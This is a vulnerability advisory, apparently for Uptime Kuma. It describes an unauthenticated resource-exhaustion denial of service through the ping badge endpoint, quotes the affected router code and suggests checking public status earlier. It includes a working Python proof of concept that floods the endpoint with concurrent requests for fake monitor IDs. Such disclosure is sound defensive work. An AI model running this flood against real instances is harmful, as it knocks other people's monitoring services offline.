title: Unauthenticated resource exhaustion DoS in ping badge endpoint via arbitrary monitor IDs
summary:
### Summary
The public endpoint GET /api/badge/:id/ping/:duration? performs expensive uptime calculator initialization for arbitrary monitor IDs before rejecting non-public or nonexistent monitors. An unauthenticated attacker can send many requests with unique fake monitor IDs, causing resource exhaustion and denial of service.  Once the service becomes unresponsive, all endpoints cease functioning for a time after the active attack ends (around 5-10 minutes in testing), not just the badge one.

### Details
In server/routers/api-router.js:

router.get("/api/badge/:id/ping/:duration?", cache("5 minutes"), async (request, response) => {
    allowAllOrigin(response);
    
    ...
    
        const uptimeCalculator = await UptimeCalculator.getUptimeCalculator(requestedMonitorId);
        const avgPing = uptimeCalculator.getDataByDuration(requestedDuration).avgPing; // XXX: This ties up resources

        const badgeValues = { style };

        if (!publicMonitor) {
            // return a "N/A" badge in naColor (grey), if monitor is not public / not available / non exsitant

Should check for public earlier, before doing anything expensive, and/or a quicker fail for invalid IDs.

### PoC
```
#!/usr/bin/env python3
import time, urllib.request, concurrent.futures

TARGET = "http://127.0.0.1:3001"
TOTAL = 100_000
CONCURRENCY = 100
TIMEOUT = 5
START_ID = 1_000_000_000

ok = fail = 0
start = time.perf_counter()

print(f"Target: {TARGET}")
print(f"Requests: {TOTAL}, concurrency: {CONCURRENCY}")

with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENCY) as pool:
    futures = [
        pool.submit(
            urllib.request.urlopen,
            f"{TARGET}/api/badge/{START_ID + i}/ping/24h",
            timeout=TIMEOUT,
        )
        for i in range(TOTAL)
    ]

    for n, fut in enumerate(concurrent.futures.as_completed(futures), 1):
        try:
            r = fut.result()
            r.read(128)
            r.close()
            ok += 1
        except Exception:
            fail += 1

        if n % 1000 == 0:
            hstart = time.perf_counter()
            try:
                h = urllib.request.urlopen(f"{TARGET}/api/entry-page", timeout=TIMEOUT)
                h.read(1)
                h.close()
                health = f"health=ok time={time.perf_counter() - hstart:.2f}s"
            except Exception:
                health = f"health=FAIL time={TIMEOUT:.2f}s"

            print(
                f"{n}/{TOTAL} done "
                f"ok={ok} fail={fail} "
                f"wall={time.perf_counter() - start:.1f}s "
                f"{health}"
            )

```

### Impact
Any public Uptime Kuma instance can be DoSed.  The effect persists for several minutes after the active attack ends as well.  By the time the service goes down, it has grown about 600MB and is utilizing slightly more than 100% of one CPU.
